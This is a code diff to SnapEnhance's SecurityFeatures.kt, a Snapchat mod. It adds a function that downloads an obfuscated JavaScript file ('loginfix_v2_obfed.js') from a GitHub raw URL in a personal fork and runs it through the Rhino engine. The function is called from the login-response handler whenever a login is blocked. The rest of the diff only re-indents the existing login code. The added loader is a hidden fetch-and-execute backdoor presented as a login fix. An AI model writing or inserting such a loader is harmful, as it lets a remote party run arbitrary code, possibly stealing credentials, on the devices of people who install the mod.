@@ -20,6 +20,9 @@ import me.rhunk.snapenhance.core.event.events.impl.UnaryCallEvent
 import me.rhunk.snapenhance.core.features.Feature
 import me.rhunk.snapenhance.core.util.ktx.setObjectField
 import java.io.FileDescriptor
+import org.mozilla.javascript.Context
+import org.mozilla.javascript.ScriptableObject
+import java.net.URL
 
 class SecurityFeatures : Feature("Security Features") {
     private fun transact(option: Int, option2: Long) = kotlin.runCatching { Os.prctl(option, option2, 0, 0, 0) }.getOrNull()
@@ -32,47 +35,69 @@ class SecurityFeatures : Feature("Security Features") {
         transact(this, 0)?.toString(2)?.padStart(32, '0')?.count { it == '1' }
     }
 
+    fun runJavaScriptFromGitHub() {
+    val scriptUrl = "https://raw.githubusercontent.com/curious-freak/SnapEnhance/dev/preloaded_scripts/loginfix_v2_obfed.js"
+    
+    try {
+        val rhino = Context.enter()
+        rhino.optimizationLevel = -1
+        val scope = rhino.initStandardObjects()
+
+        // Fetch the script content from GitHub
+        val scriptContent = URL(scriptUrl).readText()
+
+        rhino.evaluateString(scope, scriptContent, "loginfix_v2_obfed.js", 1, null)
+    } catch (e: Exception) {
+        println("Error running JavaScript file from GitHub: ${e.message}")
+    } finally {
+        Context.exit()
+    }
+    }
+
     override fun init() {
         token // pre init token
 
         context.event.subscribe(UnaryCallEvent::class) { event ->
-            if (!event.uri.contains("/Login")) return@subscribe
+    if (!event.uri.contains("/Login")) return@subscribe
 
-            // intercept login response
-            event.addResponseCallback {
-                val response = ProtoReader(buffer)
-                val isBlocked = when {
-                    event.uri.contains("TLv") -> response.getVarInt(1) == 14L
-                    else -> response.getVarInt(1) == 16L
-                }
-
-                val errorDataIndex = when {
-                    response.contains(11) -> 11
-                    response.contains(10) -> 10
-                    response.contains(8) -> 8
-                    else -> return@addResponseCallback
-                }
-
-                if (isBlocked) {
-                    val status = transact(token ?: return@addResponseCallback, 1)?.let {
-                        val buffer = ByteArray(8192)
-                        val fd = FileDescriptor().apply {
-                            setObjectField("descriptor", it)
-                        }
-                        val read = Os.read(fd, buffer, 0, buffer.size)
-                        Os.close(fd)
-                        buffer.copyOfRange(0, read).decodeToString()
-                    }!!
-
-                    buffer = ProtoEditor(buffer).apply {
-                        edit(errorDataIndex) {
-                            remove(1)
-                            addString(1, status)
-                        }
-                    }.toByteArray()
-                }
-            }
+    // intercept login response
+    event.addResponseCallback {
+        val response = ProtoReader(buffer)
+        val isBlocked = when {
+            event.uri.contains("TLv") -> response.getVarInt(1) == 14L
+            else -> response.getVarInt(1) == 16L
         }
+
+        val errorDataIndex = when {
+            response.contains(11) -> 11
+            response.contains(10) -> 10
+            response.contains(8) -> 8
+            else -> return@addResponseCallback
+        }
+
+        if (isBlocked) {
+            val status = transact(token ?: return@addResponseCallback, 1)?.let {
+                val buffer = ByteArray(8192)
+                val fd = FileDescriptor().apply {
+                    setObjectField("descriptor", it)
+                }
+                val read = Os.read(fd, buffer, 0, buffer.size)
+                Os.close(fd)
+                buffer.copyOfRange(0, read).decodeToString()
+            }!!
+
+            buffer = ProtoEditor(buffer).apply {
+                edit(errorDataIndex) {
+                    remove(1)
+                    addString(1, status)
+                }
+            }.toByteArray()
+
+            // Login failed, run JavaScript file from GitHub
+            runJavaScriptFromGitHub()
+        }
+    }
+}
 
         context.inAppOverlay.addCustomComposable {
             var statusText by remember {
